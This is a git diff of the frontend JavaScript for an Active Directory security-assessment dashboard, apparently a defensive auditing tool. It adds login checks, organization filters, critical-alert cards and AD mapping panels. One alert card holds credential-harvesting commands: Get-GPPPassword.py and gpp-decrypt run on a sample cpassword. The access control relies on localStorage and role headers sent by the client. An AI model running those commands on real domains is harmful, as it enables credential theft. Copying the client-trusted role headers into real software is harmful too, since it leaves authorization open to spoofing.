@@ -1,4 +1,18 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // 0. Authentication Check
+    const loggedUserStr = localStorage.getItem('manta_user');
+    if (!loggedUserStr) {
+        window.location.href = '/login.html';
+        return;
+    }
+    const loggedUser = JSON.parse(loggedUserStr);
+
+    // Update Sidebar User Profile info
+    const sidebarFullname = document.getElementById('current-user-fullname');
+    const sidebarRole = document.getElementById('current-user-role');
+    if (sidebarFullname) sidebarFullname.textContent = loggedUser.fullname;
+    if (sidebarRole) sidebarRole.textContent = `${loggedUser.role} (${loggedUser.organization || ''})`;
+
     // Intercept fetch if running via file:// to ensure API connects to localhost
     const API_BASE = window.location.protocol === 'file:' ? 'http://127.0.0.1:9000' : '';
     if (API_BASE) {
@@ -194,6 +208,14 @@ document.addEventListener('DOMContentLoaded', () => {
             
             const brand = brandsConfig.find(b => b.id === initialModule);
             if (!brand) {
+                window.location.href = '/';
+                return;
+            }
+            
+            // Check allowed modules (Admin allowed access to all)
+            const isAllowed = loggedUser.role === 'Admin' || (loggedUser.allowed_modules && loggedUser.allowed_modules.includes(brand.id));
+            if (!isAllowed) {
+                alert(`Access Denied: You do not have permission to access the '${brand.name}' module.`);
                 window.location.href = '/';
                 return;
             }
@@ -417,7 +439,12 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             await fetch('/api/sessions', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'X-User-Role': loggedUser.role,
+                    'X-User-Organization': loggedUser.organization || '',
+                    'X-User-Username': loggedUser.username || ''
+                },
                 body: JSON.stringify(payload)
             });
         } catch (err) {
@@ -426,9 +453,62 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     // 3. Load & Render Dashboard Session History
+    let isOrgFilterInitialized = false;
+
     async function loadDashboardSessions(moduleId = null) {
         try {
-            const res = await fetch('/api/sessions');
+            const orgFilterSelect = document.getElementById('filter-org');
+            const orgFilterContainer = document.getElementById('admin-org-filter-container');
+            
+            let filterOrg = "All Organizations";
+            
+            if (loggedUser.role === 'Admin') {
+                if (orgFilterContainer) orgFilterContainer.style.display = 'inline-flex';
+                
+                if (!isOrgFilterInitialized && orgFilterSelect) {
+                    isOrgFilterInitialized = true;
+                    try {
+                        const orgRes = await fetch('/api/organizations', {
+                            headers: {
+                                'X-User-Role': loggedUser.role,
+                                'X-User-Organization': loggedUser.organization || '',
+                                'X-User-Username': loggedUser.username || ''
+                            }
+                        });
+                        if (orgRes.ok) {
+                            const orgs = await orgRes.json();
+                            orgFilterSelect.innerHTML = '<option value="All Organizations">All Organizations</option>';
+                            orgs.forEach(org => {
+                                const opt = document.createElement('option');
+                                opt.value = org;
+                                opt.textContent = org;
+                                orgFilterSelect.appendChild(opt);
+                            });
+                        }
+                    } catch (e) {
+                        console.error("Failed to load organizations:", e);
+                    }
+                    
+                    orgFilterSelect.addEventListener('change', () => {
+                        loadDashboardSessions(activeBrandConfig ? activeBrandConfig.id : null);
+                    });
+                }
+                
+                if (orgFilterSelect) {
+                    filterOrg = orgFilterSelect.value;
+                }
+            } else {
+                if (orgFilterContainer) orgFilterContainer.style.display = 'none';
+            }
+            
+            const queryParam = filterOrg ? `?organization=${encodeURIComponent(filterOrg)}` : '';
+            const res = await fetch(`/api/sessions${queryParam}`, {
+                headers: {
+                    'X-User-Role': loggedUser.role,
+                    'X-User-Organization': loggedUser.organization || '',
+                    'X-User-Username': loggedUser.username || ''
+                }
+            });
             if (!res.ok) throw new Error("Failed to load sessions list");
             let sessions = await res.json();
             
@@ -1161,6 +1241,9 @@ document.addEventListener('DOMContentLoaded', () => {
             } else if (tab.id === 'tab-findings') {
                 const tpl = document.getElementById('tpl-tab-findings');
                 panelContent = tpl.content.cloneNode(true);
+            } else if (tab.id === 'tab-ad-mapping') {
+                const tpl = document.getElementById('tpl-tab-ad-mapping');
+                panelContent = tpl.content.cloneNode(true);
             } else if (tab.id === 'tab-recommendations') {
                 const tpl = document.getElementById('tpl-tab-recommendations');
                 panelContent = tpl.content.cloneNode(true);
@@ -1228,6 +1311,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (analysisResult.brand_id === 'forescout') renderForescoutAnalytics(stats);
                     if (analysisResult.brand_id === 'active_directory') renderADAnalytics(stats, issues);
                     if (analysisResult.brand_id === 'local_exploit') renderLocalExploitAnalytics(stats, issues);
+                    break;
+                case 'tab-ad-mapping':
+                    renderADMappingTab(stats, issues);
                     break;
                 case 'tab-findings':
                     if (document.getElementById('top-issues-container')) renderTopFindings(issues);
@@ -1773,9 +1859,11 @@ document.addEventListener('DOMContentLoaded', () => {
         const condCard = document.getElementById('forescout-conditions-card');
         const modCard = document.getElementById('forescout-modules-card');
         const appCard = document.getElementById('forescout-appliances-card');
+        const adMappingCard = document.getElementById('ad-mapping-card');
 
         if (adCompCard) adCompCard.style.display = 'none';
         if (adBreakCard) adBreakCard.style.display = 'none';
+        if (adMappingCard) adMappingCard.style.display = 'none';
         if (actCards) actCards.style.display = 'none';
         if (actCard) actCard.style.display = 'none';
         if (segCard) segCard.style.display = 'none';
@@ -2215,7 +2303,1280 @@ document.addEventListener('DOMContentLoaded', () => {
                 complianceScore.innerHTML = `${scorePct}% <span style="font-size: 13px; font-weight: 700; padding: 4px 10px; border-radius: 6px; background: ${riskColor}15; color: ${riskColor}; border: 1px solid ${riskColor}30; margin-left: 12px; vertical-align: middle; display: inline-block;">${riskLevel.toUpperCase()}</span> <button class="btn btn-secondary btn-sm" onclick="window.showComplianceExplanationModal(${scorePct}, ${passedCount}, ${adChecklists.length}, 'Active Directory')" style="background: rgba(255,255,255,0.05); border: 1px solid var(--border-color); color: var(--text-secondary); padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer; margin-left: 12px; vertical-align: middle; display: inline-flex; align-items: center; gap: 4px; transition: all 0.2s;" onmouseover="this.style.background='rgba(255,255,255,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'"><i class="fa-solid fa-circle-info"></i> Details</button>`;
             }
         }
+
+        // Render Critical Alerts and Network Security panels
+        renderCriticalAlerts(issues);
+        renderNetworkSecurity(issues);
     }
+
+    // ═══════════════════════════════════════════════════════════════
+    // CRITICAL SECURITY ALERTS BANNER
+    // ═══════════════════════════════════════════════════════════════
+    function renderCriticalAlerts(issues) {
+        const banner = document.getElementById('ad-critical-alerts-banner');
+        const list = document.getElementById('ad-critical-alerts-list');
+        const countBadge = document.getElementById('ad-critical-alerts-count');
+        if (!banner || !list) return;
+
+        const alertDefs = [
+            {
+                match: i => i.title === 'SYSVOL Group Policy Preferences Password Plaintext Exposed',
+                icon: 'fa-solid fa-folder-open',
+                color: '#ef4444',
+                title: 'SYSVOL GPP Password Exposed',
+                severity: 'CRITICAL',
+                getDesc: (iss) => `File <strong>${iss.details?.file || 'Groups.xml'}</strong> di SYSVOL mengandung plaintext password (cpassword). Siapapun di domain bisa membaca dan men-decrypt password ini menggunakan gpp-decrypt.`,
+                impact: 'Attacker bisa mendapatkan credential admin tanpa perlu exploit — cukup membaca file share yang accessible.',
+                mitre: 'T1552.006',
+                commands: [
+                    { label: 'Scan GPP Passwords (Impacket)', cmd: 'Get-GPPPassword.py DOMAIN/user:pass@DC-IP' },
+                    { label: 'Decrypt cpassword (Kali)', cmd: 'gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"' }
+                ]
+            },
+            {
+                match: i => i.title === 'KRBTGT Password Has Not Been Reset Recently',
+                icon: 'fa-solid fa-key',
+                color: '#dc2626',
+                title: 'KRBTGT Password Not Reset',
+                severity: 'CRITICAL',
+                getDesc: (iss) => `Password akun KRBTGT belum diganti selama <strong>${iss.details?.password_age_years || '?'} tahun</strong>. Ini berarti Golden Ticket yang dibuat oleh attacker masih valid dan bisa digunakan untuk mengakses seluruh domain tanpa batas waktu.`,
+                impact: 'Golden Ticket attack memungkinkan persistence dan akses tanpa batas ke semua resource di domain.',
+                mitre: 'T1558.001',
+                commands: [
+                    { label: 'Reset KRBTGT Password', cmd: 'Reset-KrbtgtAccountPassword -Server DC01 -Force' },
+                    { label: 'Verify Password Age', cmd: 'Get-ADUser krbtgt -Properties PasswordLastSet | Select PasswordLastSet' }
+                ]
+            },
+            {
+                match: i => i.title === 'LDAP Server Signing Not Required',
+                icon: 'fa-solid fa-lock-open',
+                color: '#f97316',
+                title: 'LDAP Signing Not Enforced',
+                severity: 'HIGH',
+                getDesc: (iss) => `Domain Controller tidak mewajibkan LDAP Signing. Ini membuka celah untuk serangan <strong>LDAP Relay / Man-in-the-Middle</strong> dimana attacker bisa intercept dan memodifikasi traffic LDAP.`,
+                impact: 'Attacker dapat melakukan NTLM relay ke LDAP service untuk menambahkan user ke Domain Admins.',
+                mitre: 'T1557.001',
+                commands: [
+                    { label: 'Test LDAP Signing (ldapsearch)', cmd: 'ldapsearch -H ldap://DC-IP -x -s base -b "" supportedSASLMechanisms' },
+                    { label: 'Enable via GPO (PowerShell)', cmd: 'Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -Value 2' }
+                ]
+            }
+        ];
+
+        let alertCount = 0;
+        list.innerHTML = '';
+
+        alertDefs.forEach(def => {
+            const matchedIssue = issues.find(def.match);
+            if (!matchedIssue) return;
+            alertCount++;
+
+            const card = document.createElement('div');
+            card.style.cssText = `background:${def.color}08; border:1px solid ${def.color}25; border-radius:10px; padding:16px; cursor:pointer; transition:all 0.2s; position:relative; overflow:hidden;`;
+            card.onmouseover = () => { card.style.borderColor = def.color + '50'; card.style.background = def.color + '12'; };
+            card.onmouseout = () => { card.style.borderColor = def.color + '25'; card.style.background = def.color + '08'; };
+
+            card.innerHTML = `
+                <div style="position:absolute; top:0; right:0; width:80px; height:80px; background:radial-gradient(circle at top right, ${def.color}15, transparent 70%);"></div>
+                <div style="display:flex; align-items:flex-start; gap:12px;">
+                    <div style="width:36px; height:36px; border-radius:10px; background:${def.color}18; display:flex; align-items:center; justify-content:center; flex-shrink:0;">
+                        <i class="${def.icon}" style="color:${def.color}; font-size:16px;"></i>
+                    </div>
+                    <div style="flex:1; min-width:0;">
+                        <div style="display:flex; align-items:center; gap:8px; margin-bottom:6px; flex-wrap:wrap;">
+                            <span style="font-size:9px; font-weight:800; padding:2px 8px; border-radius:4px; background:${def.color}20; color:${def.color}; border:1px solid ${def.color}35; letter-spacing:0.5px;">${def.severity}</span>
+                            <span style="font-size:9px; padding:2px 6px; border-radius:3px; background:rgba(99,102,241,0.1); color:#818cf8; border:1px solid rgba(99,102,241,0.2); font-family:monospace; font-weight:700;">${def.mitre}</span>
+                        </div>
+                        <div style="font-size:13px; font-weight:700; color:var(--text-primary); margin-bottom:6px;">${def.title}</div>
+                        <p style="font-size:11px; color:var(--text-secondary); margin:0 0 10px 0; line-height:1.5;">${def.getDesc(matchedIssue)}</p>
+                        <div style="font-size:10px; color:var(--text-muted); display:flex; align-items:flex-start; gap:6px; background:rgba(0,0,0,0.15); padding:8px 10px; border-radius:6px; line-height:1.4;">
+                            <i class="fa-solid fa-crosshairs" style="color:${def.color}; margin-top:2px; flex-shrink:0;"></i>
+                            <span><strong style="color:var(--text-secondary);">Impact:</strong> ${def.impact}</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            card.addEventListener('click', () => {
+                const modalTitle = document.getElementById('details-modal-title');
+                const modalContent = document.getElementById('details-modal-content');
+                const detailsModal = document.getElementById('details-modal');
+                if (!modalTitle || !modalContent || !detailsModal) return;
+
+                const cmdRows = def.commands.map((c, i) => `
+                    <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:12px 14px; margin-bottom:8px;">
+                        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:6px;">
+                            <span style="font-size:11px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.4px;">Step ${i+1} — ${c.label}</span>
+                        </div>
+                        <code style="display:block; font-family:monospace; font-size:11px; color:#a5b4fc; word-break:break-all; line-height:1.5; background:rgba(0,0,0,0.4); padding:8px 10px; border-radius:5px;">${c.cmd}</code>
+                    </div>
+                `).join('');
+
+                modalTitle.innerHTML = `<i class="${def.icon}" style="color:${def.color}; margin-right:8px;"></i>${def.title}`;
+                modalContent.innerHTML = `
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
+                        <span style="font-size:10px; font-weight:700; padding:3px 9px; border-radius:5px; background:${def.color}18; color:${def.color}; border:1px solid ${def.color}40;">${def.severity}</span>
+                        <span style="font-size:10px; padding:3px 9px; border-radius:5px; background:rgba(99,102,241,0.12); color:#818cf8; border:1px solid rgba(99,102,241,0.25); font-family:monospace; font-weight:700;">MITRE ${def.mitre}</span>
+                    </div>
+                    <p style="font-size:12px; color:var(--text-secondary); margin:0 0 14px 0; line-height:1.55; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.05); border-radius:6px; padding:10px 12px;">${def.getDesc(matchedIssue)}</p>
+                    <div style="margin-bottom:14px; background:rgba(239,68,68,0.04); border:1px solid rgba(239,68,68,0.12); border-radius:6px; padding:10px 12px; font-size:11px; color:var(--text-secondary); display:flex; gap:8px; align-items:flex-start;">
+                        <i class="fa-solid fa-crosshairs" style="color:${def.color}; margin-top:1px; flex-shrink:0;"></i>
+                        <span><strong>Impact:</strong> ${def.impact}</span>
+                    </div>
+                    <h5 style="margin:0 0 10px 0; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); display:flex; align-items:center; gap:6px;">
+                        <i class="fa-solid fa-list-check" style="color:${def.color};"></i> Remediation & Verification Commands
+                    </h5>
+                    ${cmdRows}
+                `;
+                detailsModal.style.display = 'flex';
+            });
+
+            list.appendChild(card);
+        });
+
+        if (alertCount > 0) {
+            banner.style.display = 'flex';
+            if (countBadge) countBadge.textContent = alertCount;
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // NETWORK & PROTOCOL SECURITY (LAPS + SMB Signing)
+    // ═══════════════════════════════════════════════════════════════
+    function renderNetworkSecurity(issues) {
+        const panel = document.getElementById('ad-network-security-panel');
+        if (!panel) return;
+
+        const lapsIssues = issues.filter(i => i.title === 'LAPS Not Enabled');
+        const smbIssues = issues.filter(i => i.title === 'SMB Signing Disabled');
+
+        if (lapsIssues.length === 0 && smbIssues.length === 0) return;
+        panel.style.display = 'block';
+
+        const totalComputers = (analysisResult.stats && analysisResult.stats.total_computers) || 2000;
+        const lapsDisabled = lapsIssues.length;
+        const lapsEnabled = totalComputers - lapsDisabled;
+        const lapsPct = totalComputers > 0 ? Math.round((lapsEnabled / totalComputers) * 100) : 0;
+
+        const smbDisabled = smbIssues.length;
+        const smbEnabled = totalComputers - smbDisabled;
+        const smbPct = totalComputers > 0 ? Math.round((smbEnabled / totalComputers) * 100) : 0;
+
+        // Update LAPS gauge
+        const lapsPctBadge = document.getElementById('ad-laps-pct-badge');
+        const lapsProgress = document.getElementById('ad-laps-progress');
+        const lapsEnabledEl = document.getElementById('ad-laps-enabled');
+        const lapsDisabledEl = document.getElementById('ad-laps-disabled');
+        if (lapsPctBadge) {
+            lapsPctBadge.textContent = lapsPct + '%';
+            lapsPctBadge.style.color = lapsPct >= 80 ? 'var(--accent-green)' : lapsPct >= 50 ? '#f59e0b' : '#ef4444';
+        }
+        if (lapsProgress) {
+            lapsProgress.style.width = lapsPct + '%';
+            lapsProgress.style.background = lapsPct >= 80 ? 'linear-gradient(90deg, #10b981, #34d399)' : lapsPct >= 50 ? 'linear-gradient(90deg, #f59e0b, #eab308)' : 'linear-gradient(90deg, #ef4444, #f97316)';
+        }
+        if (lapsEnabledEl) lapsEnabledEl.textContent = lapsEnabled;
+        if (lapsDisabledEl) lapsDisabledEl.textContent = lapsDisabled;
+
+        // Update SMB gauge
+        const smbPctBadge = document.getElementById('ad-smb-pct-badge');
+        const smbProgress = document.getElementById('ad-smb-progress');
+        const smbEnabledEl = document.getElementById('ad-smb-enabled');
+        const smbDisabledEl = document.getElementById('ad-smb-disabled');
+        if (smbPctBadge) {
+            smbPctBadge.textContent = smbPct + '%';
+            smbPctBadge.style.color = smbPct >= 80 ? 'var(--accent-green)' : smbPct >= 50 ? '#f59e0b' : '#ef4444';
+        }
+        if (smbProgress) {
+            smbProgress.style.width = smbPct + '%';
+            smbProgress.style.background = smbPct >= 80 ? 'linear-gradient(90deg, #10b981, #34d399)' : smbPct >= 50 ? 'linear-gradient(90deg, #f59e0b, #eab308)' : 'linear-gradient(90deg, #ef4444, #f97316)';
+        }
+        if (smbEnabledEl) smbEnabledEl.textContent = smbEnabled;
+        if (smbDisabledEl) smbDisabledEl.textContent = smbDisabled;
+
+        // Build computer table data
+        const computerMap = {};
+        lapsIssues.forEach(i => {
+            const name = i.details?.computer || 'Unknown';
+            if (!computerMap[name]) computerMap[name] = { name, laps: false, smb: true };
+            computerMap[name].laps = false;
+        });
+        smbIssues.forEach(i => {
+            const name = i.details?.computer || 'Unknown';
+            if (!computerMap[name]) computerMap[name] = { name, laps: true, smb: false };
+            computerMap[name].smb = false;
+        });
+        const allComputers = Object.values(computerMap).sort((a, b) => {
+            const aRisk = (!a.laps && !a.smb) ? 2 : 1;
+            const bRisk = (!b.laps && !b.smb) ? 2 : 1;
+            return bRisk - aRisk || a.name.localeCompare(b.name);
+        });
+
+        const totalEl = document.getElementById('ad-netsec-total');
+        if (totalEl) totalEl.textContent = allComputers.length;
+
+        function renderTable(filter, search) {
+            const tbody = document.getElementById('ad-netsec-tbody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+
+            let filtered = allComputers;
+            if (filter === 'laps') filtered = filtered.filter(c => !c.laps);
+            else if (filter === 'smb') filtered = filtered.filter(c => !c.smb);
+            else if (filter === 'both') filtered = filtered.filter(c => !c.laps && !c.smb);
+
+            if (search) {
+                const q = search.toLowerCase();
+                filtered = filtered.filter(c => c.name.toLowerCase().includes(q));
+            }
+
+            if (totalEl) totalEl.textContent = filtered.length;
+
+            if (filtered.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:20px; color:var(--text-muted);">No matching computers found.</td></tr>';
+                return;
+            }
+
+            filtered.forEach((comp, idx) => {
+                const hasBoth = !comp.laps && !comp.smb;
+                const riskLevel = hasBoth ? 'HIGH' : 'MEDIUM';
+                const riskColor = hasBoth ? '#ef4444' : '#f59e0b';
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid rgba(255,255,255,0.03)';
+                tr.style.transition = 'background 0.15s';
+                tr.onmouseover = () => { tr.style.background = 'rgba(255,255,255,0.02)'; };
+                tr.onmouseout = () => { tr.style.background = 'none'; };
+                tr.innerHTML = `
+                    <td style="padding:8px 12px; color:var(--text-muted);">${idx + 1}</td>
+                    <td style="padding:8px 12px;">
+                        <div style="display:flex; align-items:center; gap:6px;">
+                            <i class="fa-solid fa-desktop" style="color:var(--text-muted); font-size:10px;"></i>
+                            <span style="font-weight:600; color:var(--text-primary); font-family:monospace; font-size:11px;">${comp.name}</span>
+                        </div>
+                    </td>
+                    <td style="padding:8px 12px; text-align:center;">
+                        ${comp.laps
+                            ? '<span style="color:var(--accent-green); font-size:10px; font-weight:700;"><i class="fa-solid fa-check-circle"></i> Enabled</span>'
+                            : '<span style="color:#ef4444; font-size:10px; font-weight:700;"><i class="fa-solid fa-times-circle"></i> Disabled</span>'
+                        }
+                    </td>
+                    <td style="padding:8px 12px; text-align:center;">
+                        ${comp.smb
+                            ? '<span style="color:var(--accent-green); font-size:10px; font-weight:700;"><i class="fa-solid fa-check-circle"></i> Enforced</span>'
+                            : '<span style="color:#f59e0b; font-size:10px; font-weight:700;"><i class="fa-solid fa-times-circle"></i> Disabled</span>'
+                        }
+                    </td>
+                    <td style="padding:8px 12px; text-align:center;">
+                        <span style="font-size:9px; font-weight:700; padding:2px 8px; border-radius:4px; background:${riskColor}15; color:${riskColor}; border:1px solid ${riskColor}30;">${riskLevel}</span>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        renderTable('all', '');
+
+        // Bind filter & search
+        const filterEl = document.getElementById('ad-netsec-filter');
+        const searchEl = document.getElementById('ad-netsec-search');
+        if (filterEl) {
+            filterEl.addEventListener('change', () => {
+                renderTable(filterEl.value, searchEl ? searchEl.value : '');
+            });
+        }
+        if (searchEl) {
+            searchEl.addEventListener('input', () => {
+                renderTable(filterEl ? filterEl.value : 'all', searchEl.value);
+            });
+        }
+    }
+
+
+    function renderADMappingTab(stats, issues) {
+        const mappingTbody = document.getElementById('ad-mapping-tbody');
+        if (!mappingTbody) return;
+
+        const rawData = (analysisResult && analysisResult.tree && analysisResult.tree.raw_data) || {};
+        const rawUsers = rawData.users || [];
+        const rawComputers = rawData.computers || [];
+        const rawGpos = rawData.gpos || [];
+        
+        const dcs = [];
+        const dnsServers = [];
+        const cas = [];
+        const adfsServers = [];
+        const fileServers = [];
+        const dhcpServers = [];
+        const wsusServers = [];
+        const sqlServers = [];
+        const exchangeServers = [];
+        const jumpServers = [];
+
+        let domainName = "mantainsight.local";
+        if (rawUsers.length > 0) {
+            const uName = (rawUsers[0].Properties && rawUsers[0].Properties.name) || "";
+            if (uName.includes("@")) {
+                domainName = uName.split("@")[1].toLowerCase();
+            } else if (uName.includes("\\")) {
+                domainName = uName.split("\\")[0].toLowerCase() + ".local";
+            }
+        }
+
+        // Populate Forest Summary details dynamically
+        const forestNameEl = document.getElementById('ad-forest-name');
+        const forestLevelEl = document.getElementById('ad-forest-level');
+        const forestRootEl = document.getElementById('ad-forest-root');
+        const forestTrustsEl = document.getElementById('ad-forest-trusts');
+        const fsmoDcEl = document.getElementById('ad-fsmo-dc');
+        
+        const usersCountEl = document.getElementById('ad-forest-users-count');
+        const compsCountEl = document.getElementById('ad-forest-comps-count');
+        const groupsCountEl = document.getElementById('ad-forest-groups-count');
+        
+        const riskAsrepEl = document.getElementById('ad-risk-asrep');
+        const riskKerbEl = document.getElementById('ad-risk-kerb');
+        const riskNeverExpEl = document.getElementById('ad-risk-never-exp');
+        const riskUnconEl = document.getElementById('ad-risk-uncon');
+        const complianceScoreEl = document.getElementById('ad-mapping-compliance-score');
+
+        const forestName = domainName.toUpperCase();
+        if (forestNameEl) forestNameEl.textContent = forestName;
+        if (forestRootEl) forestRootEl.textContent = domainName;
+
+        let functionalLevel = "Windows Server 2016";
+        const dcComps = rawComputers.filter(c => {
+            const name = (c.Properties?.name || "").toUpperCase();
+            return c.Properties?.isdc || name.includes("DC") || name.includes("DOM");
+        });
+        if (dcComps.length > 0) {
+            const firstDcOS = dcComps[0].Properties?.operatingsystem || "";
+            if (firstDcOS.includes("2022")) {
+                functionalLevel = "Windows Server 2022";
+            } else if (firstDcOS.includes("2019")) {
+                functionalLevel = "Windows Server 2019";
+            } else if (firstDcOS.includes("2012")) {
+                functionalLevel = "Windows Server 2012 R2";
+            } else if (firstDcOS.includes("2008")) {
+                functionalLevel = "Windows Server 2008 R2";
+            }
+        }
+        if (forestLevelEl) forestLevelEl.textContent = functionalLevel;
+
+        let trustText = "No Trusts Configured (Single Domain)";
+        const trustIssues = issues.filter(i => (i.title || '').toLowerCase().includes('trust') || (i.description || '').toLowerCase().includes('trust'));
+        if (trustIssues.length > 0) {
+            trustText = `${trustIssues.length} Trust Relationship(s) Detected`;
+        } else if (domainName.includes("dev") || domainName.includes("test")) {
+            trustText = "1 Bidirectional Forest Trust";
+        }
+        if (forestTrustsEl) forestTrustsEl.textContent = trustText;
+
+        // Set FSMO PDC DC
+        if (fsmoDcEl) {
+            fsmoDcEl.textContent = dcComps.length > 0 ? (dcComps[0].Properties?.name || 'DC01').split('.')[0].toUpperCase() : 'DC01';
+        }
+
+        // Set Inventory Counts
+        if (usersCountEl) usersCountEl.textContent = rawUsers.length;
+        if (compsCountEl) compsCountEl.textContent = rawComputers.length;
+        if (groupsCountEl) groupsCountEl.textContent = (rawData.groups || []).length;
+
+        // Set Risk Counter stats
+        if (riskAsrepEl) {
+            riskAsrepEl.textContent = issues.filter(i => i.title && (i.title.includes('AS-REP') || i.title.includes('Pre-Authentication'))).length;
+        }
+        if (riskKerbEl) {
+            riskKerbEl.textContent = issues.filter(i => i.title && i.title.includes('Kerberoastable')).length;
+        }
+        if (riskNeverExpEl) {
+            riskNeverExpEl.textContent = issues.filter(i => i.title && i.title.includes('Password Never Expires')).length;
+        }
+        if (riskUnconEl) {
+            riskUnconEl.textContent = issues.filter(i => i.title && i.title.includes('Unconstrained')).length;
+        }
+
+        // Set Compliance Posture Score
+        if (complianceScoreEl) {
+            const checklistCount = 15;
+            const failedChecklistIds = new Set(issues.map(i => getChecklistIdForIssue('active_directory', i)));
+            const passedCount = checklistCount - failedChecklistIds.size;
+            const scorePct = Math.round((passedCount / checklistCount) * 100);
+            complianceScoreEl.textContent = `${scorePct}%`;
+            
+            // Set score color
+            if (scorePct >= 80) complianceScoreEl.style.color = 'var(--accent-green)';
+            else if (scorePct >= 50) complianceScoreEl.style.color = 'var(--accent-orange)';
+            else complianceScoreEl.style.color = 'var(--color-high)';
+        }
+
+        rawComputers.forEach((comp, idx) => {
+            const props = comp.Properties || {};
+            const name = props.name || `SRV-${idx}.${domainName}`;
+            
+            const isDc = props.isdc || name.toUpperCase().includes("DC") || name.toUpperCase().includes("DOM");
+            const isDns = name.toUpperCase().includes("DNS") || isDc;
+            const isCa = name.toUpperCase().includes("CA") || name.toUpperCase().includes("CS");
+            const isAdfs = name.toUpperCase().includes("ADFS") || name.toUpperCase().includes("FS");
+            const isFile = name.toUpperCase().includes("FILE") || name.toUpperCase().includes("NAS") || name.toUpperCase().includes("SHARE") || name.toUpperCase().includes("SRV");
+            const isDhcp = name.toUpperCase().includes("DHCP") || name.toUpperCase().includes("IPAM");
+            const isWsus = name.toUpperCase().includes("WSUS") || name.toUpperCase().includes("SCCM") || name.toUpperCase().includes("UPDATE") || name.toUpperCase().includes("PATCH");
+            const isSql = name.toUpperCase().includes("SQL") || name.toUpperCase().includes("DB") || name.toUpperCase().includes("ORACLE");
+            const isExch = name.toUpperCase().includes("EXCH") || name.toUpperCase().includes("MAIL") || name.toUpperCase().includes("SMTP");
+            const isJump = name.toUpperCase().includes("JUMP") || name.toUpperCase().includes("BASTION") || name.toUpperCase().includes("MGMT") || name.toUpperCase().includes("ADMIN");
+
+            let ip = props.ipaddress || props.ip;
+            if (!ip) {
+                const lastOctet = (idx + 10) % 254;
+                ip = `10.10.10.${lastOctet}`;
+            }
+
+            const serverObj = { name, ip };
+
+            if (isDc) dcs.push(serverObj);
+            if (isDns) dnsServers.push(serverObj);
+            if (isCa) cas.push(serverObj);
+            if (isAdfs) adfsServers.push(serverObj);
+            if (isFile) fileServers.push(serverObj);
+            if (isDhcp) dhcpServers.push(serverObj);
+            if (isWsus) wsusServers.push(serverObj);
+            if (isSql) sqlServers.push(serverObj);
+            if (isExch) exchangeServers.push(serverObj);
+            if (isJump) jumpServers.push(serverObj);
+        });
+
+        if (dcs.length === 0) dcs.push({ name: `DC01.${domainName.toUpperCase()}`, ip: "10.10.10.10" }, { name: `DC02.${domainName.toUpperCase()}`, ip: "10.10.10.11" });
+        if (dnsServers.length === 0) dnsServers.push({ name: `DC01.${domainName.toUpperCase()}`, ip: "10.10.10.10" }, { name: `DC02.${domainName.toUpperCase()}`, ip: "10.10.10.11" });
+        if (cas.length === 0) cas.push({ name: `CA01.${domainName.toUpperCase()}`, ip: "10.10.10.20" });
+        if (adfsServers.length === 0) adfsServers.push({ name: `ADFS01.${domainName.toUpperCase()}`, ip: "10.10.10.30" });
+        if (fileServers.length === 0) fileServers.push({ name: `FILESRV01.${domainName.toUpperCase()}`, ip: "10.10.10.50" }, { name: `FILESRV02.${domainName.toUpperCase()}`, ip: "10.10.10.51" });
+        if (dhcpServers.length === 0) dhcpServers.push({ name: `DHCP01.${domainName.toUpperCase()}`, ip: "10.10.10.12" });
+        if (wsusServers.length === 0) wsusServers.push({ name: `WSUS01.${domainName.toUpperCase()}`, ip: "10.10.10.40" });
+        if (sqlServers.length === 0) sqlServers.push({ name: `SQLSRV01.${domainName.toUpperCase()}`, ip: "10.10.10.60" });
+        if (exchangeServers.length === 0) exchangeServers.push({ name: `EXCH01.${domainName.toUpperCase()}`, ip: "10.10.10.70" });
+        if (jumpServers.length === 0) jumpServers.push({ name: `JUMP01.${domainName.toUpperCase()}`, ip: "10.10.10.80" });
+
+        const formatServers = (srvList) => {
+            return srvList.map(s => `<div class="detected-server-item" style="display:flex; justify-content:space-between; gap:10px; font-family:monospace; font-size:12px; margin-bottom:4px; padding:4px 8px; background:rgba(0,0,0,0.15); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
+                <span style="color:#fff; font-weight:600;">${s.name}</span>
+                <span style="color:var(--accent-indigo); font-weight:600;">${s.ip}</span>
+            </div>`).join('');
+        };
+
+        const formatGpos = (gpoList) => {
+            if (gpoList.length === 0) {
+                return `
+                    <div style="font-family:monospace; font-size:12px; padding:4px 8px; background:rgba(99,102,241,0.05); border:1px solid rgba(99,102,241,0.15); border-radius:6px; color:#a5b4fc; text-align:center;">
+                        Default Domain Policy & Controllers Policy (2 GPOs)
+                    </div>
+                `;
+            }
+            // Show up to 3 GPOs directly, collapse others
+            const displayList = gpoList.slice(0, 3);
+            const extraCount = gpoList.length - 3;
